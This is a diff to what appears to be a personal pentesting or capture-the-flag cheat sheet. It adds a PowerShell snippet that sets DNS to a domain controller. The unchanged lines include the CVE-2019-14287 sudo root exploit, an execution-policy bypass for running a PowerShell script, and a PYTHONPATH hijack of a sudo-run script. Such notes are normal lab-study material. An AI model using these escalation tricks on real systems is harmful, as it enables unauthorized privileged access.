@@ -46,6 +46,11 @@ sudo -u#-1 /bin/bash # CVE-2019-14287
 C:\Windows\System32\drivers\etc\hosts # /etc/hosts
 powershell.exe -exec Bypass -File '.\a541a.ps1' # run ps1 file in windows
 ---------------------------------------------------------------------
+# /etc/resolv.conf
+$dnsip = "<IP Domain Controller>"
+$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
+Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
+---------------------------------------------------------------------
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
 
